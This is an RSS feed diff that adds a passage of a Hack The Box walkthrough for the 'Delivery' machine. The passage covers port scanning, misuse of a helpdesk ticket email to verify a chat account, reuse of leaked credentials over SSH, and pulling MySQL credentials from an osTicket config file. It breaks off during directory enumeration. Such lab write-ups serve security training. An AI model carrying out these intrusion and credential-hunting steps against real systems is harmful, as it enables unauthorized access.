@@ -6,7 +6,348 @@
     <description>Recent content in Linux on 5ysk3y Pwnz</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 06 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 22 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://5ysk3y.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Delivery [Easy] - Linux</title>
+      <link>https://5ysk3y.github.io/htb/guides/delivery/</link>
+      <pubDate>Sat, 22 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://5ysk3y.github.io/htb/guides/delivery/</guid>
+      <description>Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&amp;rsquo;s take a look at how I did this.</description>
+      <content>
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery.png&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Delivery is an easy Linux machine that uses a some unique/uncommon concepts to root. It starts by having us abuse a single sign-on implementation between 2 web portals and this allows us to gain access to an internal chat group containing some sensitive information. We use that to get a shell before we eventually locate a password hash with a small twist. Let&amp;rsquo;s take a look at how I did this.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;nmap-scan&#34;&gt;NMAP Scan&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Initial (top 1000) scan&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Mon Mar 15 12:24:00 2021 as: nmap -sC -sV -oA nmap/initial -vvv delivery.htb&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; delivery.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.222&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Host is up, received reset ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.023s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+rDNS record &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.222: delivery
+Scanned at 2021-03-15 12:24:00 GMT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 9s
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
+Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
+80/tcp open  http    syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; nginx 1.14.2
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Mon Mar 15 12:24:09 2021 -- 1 IP address (1 host up) scanned in 9.25 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Full scan&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Mon Mar 15 12:33:07 2021 as: nmap -p- -oA nmap/full_port -vvv delivery.htb&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; delivery.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.10.10.222&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+Host is up, received echo-reply ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.022s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+rDNS record &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.222: delivery
+Scanned at 2021-03-15 12:33:07 GMT &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 31s
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65532&lt;/span&gt; closed ports
+Reason: &lt;span style=&#34;color:#ae81ff&#34;&gt;65532&lt;/span&gt; resets
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
+80/tcp   open  http    syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
+8065/tcp open  unknown syn-ack ttl &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;
+
+Read data files from: /usr/bin/../share/nmap
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap done at Mon Mar 15 12:33:38 2021 -- 1 IP address (1 host up) scanned in 30.93 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The higher &lt;code&gt;8065&lt;/code&gt; port is actually another web port.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;user-pwn&#34;&gt;User Pwn&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s begin by outlining the different websites that are available here along with a brief description for each:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://delivery.htb&#34;&gt;http://delivery.htb&lt;/a&gt; = Loads a static HTML website that has links to the following:&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://helpdesk.delivery.htb&#34;&gt;http://helpdesk.delivery.htb&lt;/a&gt; = osTicket (no version yet)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://delivery.htb:8065&#34;&gt;http://delivery.htb:8065&lt;/a&gt; = MatterMost (All team communication in one place, searchable and accessible anywhere)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now these can be looked into with more intent.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h5 id=&#34;websites&#34;&gt;Websites&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://delivery.htb&#34;&gt;http://delivery.htb&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For the most part this is a static page with no interative elements that actually directs people to a helpdesk website. There is a button labelled &amp;ldquo;Contact Us&amp;rdquo; which also gives us some useful information:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210323125700.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;The MatterMost web server is on a higher port (8065)&lt;/p&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://helpdesk.delivery.htb&#34;&gt;http://helpdesk.delivery.htb&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;On the helpdesk, it is possible to register for an account by virtue of submitting a new ticket. The above image seems to suggest we should register with a @delivery.htb e-mail,
+and doing so creates a new ticket along with a message akin to the following message:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;You may check the status of your ticket, by navigating to the Check Status page using ticket id: 6066582.
+
+If you want to add more information to your ticket, just email 6066582@delivery.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we then look to check the ticket using our chosen @delivery.htb email address and the generated ticket number, we get access to said ticket:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328221641.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;The interesting thing here is that, if you pay attention to the information given when we create our ticket, it specifically says that you can update the ticket directly by emailing a special address, in this case: &lt;a href=&#34;mailto:6066582@delivery.htb&#34;&gt;6066582@delivery.htb&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This leads us onto Mattermost:&lt;/p&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://delivery.htb:8065/&#34;&gt;http://delivery.htb:8065/&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Registering on here, using just random information, shows that it requires email verification before you can proceed.&lt;/p&gt;
+&lt;p&gt;Using an actual burner email demonstrates that we dont actually get anything from the server, which makes sense since HTB machines have very limited internet access (e.g. nothing outside of GitHub), however we can leverage our helpdesk ticket address in hope that it can intercept any verification e-mails on the ticket itself. First, register on Mattermost with the following information, relevant to the helpdesk ticket generated earlier. In my case:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;E-mail: &lt;a href=&#34;mailto:6066582@delivery.htb&#34;&gt;6066582@delivery.htb&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;User: syskey&lt;/li&gt;
+&lt;li&gt;Pass: Password123!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And then refresh the ticket in OSTicket to get the contents of the verification e-mail:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328221453.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If you follow the URL that&amp;rsquo;s provided it will allow verification and a login to Mattermost can then be achieved.&lt;/p&gt;
+&lt;p&gt;Once logged in, the first thing shown is a team selection screen:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328222236.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Joining the Internal team, as it&amp;rsquo;d be rude not to and it&amp;rsquo;s the only option, there&amp;rsquo;s get some interesting information along with a set of creds:&lt;/p&gt;
+
+  &lt;figure class=&#34;left&#34; &gt;
+    &lt;img src=&#34;https://5ysk3y.github.io/images/guides/htb/delivery/20210328222439.png&#34;  alt=&#34;A contact us form&#34;   /&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Attempting to use these credentials via SSH gives us a user shell and the user.txt - from here, we TargetRoot.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;root-pwn&#34;&gt;Root Pwn&lt;/h1&gt;
+&lt;p&gt;As shell access was gained access via exploitation of communication between two web portals, the first thing to check would be Mattermost/OSTicket website files for potential database information. Inside of &lt;code&gt;/var/www&lt;/code&gt; there are files for the root webpage for delivery.htb as well as the OSTicket instance:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/var/www$ ls -la
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; root     root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:09 .
+drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; root     root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:08 ..
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; root     root     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 06:52 html
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; www-data www-data &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:10 osticket
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Starting with digging for DB information with OSTicket:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/var/www/osticket$ grep -ril mysql .
+./upload/include/i18n/en_US/help/tips/install.yaml
+./upload/include/ost-sampleconfig.php
+./upload/include/class.search.php
+./upload/include/cli/modules/import.php
+./upload/include/staff/system.inc.php
+./upload/include/ost-config.php
+./upload/include/class.upgrader.php
+./upload/include/class.setup.php
+./upload/include/class.file.php
+./upload/include/class.dynamic_forms.php
+./upload/include/.MANIFEST
+./upload/include/class.orm.php
+./upload/include/class.misc.php
+./upload/include/upgrader/prereq.inc.php
+./upload/include/upgrader/streams/core/9143a511-0d6099a6.patch.sql
+./upload/include/upgrader/streams/core/8f99b8bf-03ff59bf.task.php
+./upload/include/upgrader/streams/core/f5692e24-4323a6a8.patch.sql
+./upload/include/upgrader/streams/core/8b923d61-9b5550da.patch.sql
+./upload/include/mysqli.php
+./upload/include/class.timezone.php
+./upload/bootstrap.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The standout file here is &lt;code&gt;./upload/include/ost-config.php&lt;/code&gt; - namely down to the filename, but also because there is a sample variant in this list, which indicates that this may well be an updated copy that&amp;rsquo;s being used by OSTicket. Looking at the file itself shows there are indeed some MySQL Creds:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Mysql Login info
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBTYPE&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBHOST&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBNAME&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;osticket&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBUSER&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ost_user&amp;#39;&lt;/span&gt;);
+&lt;span style=&#34;color:#a6e22e&#34;&gt;define&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DBPASS&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!H3lpD3sk123!&amp;#39;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Logging into the MySQL service with that means that digging can continue:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;MariaDB [(&lt;span style=&#34;color:#66d9ef&#34;&gt;none&lt;/span&gt;)]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; databases;
+&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Database&lt;/span&gt;           &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; information_schema &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; osticket           &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;rows&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;set&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;000&lt;/span&gt; sec)
+
+MariaDB [(&lt;span style=&#34;color:#66d9ef&#34;&gt;none&lt;/span&gt;)]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; use osticket;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;Database&lt;/span&gt; changed
+
+MariaDB [osticket]&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;show&lt;/span&gt; tables &lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; Tables_in_osticket &lt;span style=&#34;color:#66d9ef&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%user%&amp;#34;&lt;/span&gt;;
+&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; Tables_in_osticket &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user           &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user__cdata    &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user_account   &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; ost_user_email     &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;--------------------+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Looking at each of these user tables, there don&amp;rsquo;t appear to be any useful hashes, which sucks, so the next step is to look at Mattermost to see if that has an associated DB:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:~$ find / -type d -name mattermost 2&amp;gt;/dev/null
+/opt/mattermost
+/var/lib/mysql/mattermost
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There &lt;em&gt;is&lt;/em&gt; a folder for Mattermost within MySQL&amp;rsquo;s directory structutre, which is a good sign. The file system contents are also somewhat interesting:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;maildeliverer@Delivery:/opt/mattermost$ ls -la
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;288&lt;/span&gt;
+drwxrwxr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:24 .
+drwxr-xr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; root       root         &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:22 ..
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:53 bin
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:24 client
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:23 config
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 17:15 data
+-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;2052&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 ENTERPRISE-EDITION-LICENSE.txt
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 fonts
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 i18n
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 09:23 logs
+-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost    &lt;span style=&#34;color:#ae81ff&#34;&gt;898&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 manifest.txt
+-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost &lt;span style=&#34;color:#ae81ff&#34;&gt;229264&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 NOTICE.txt
+drwxr--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 17:15 plugins
+drwxrwxr-x  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:53 prepackaged_plugins
+-rw-rw-r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; mattermost mattermost   &lt;span style=&#34;color:#ae81ff&#34;&gt;6262&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; 08:52 README.md
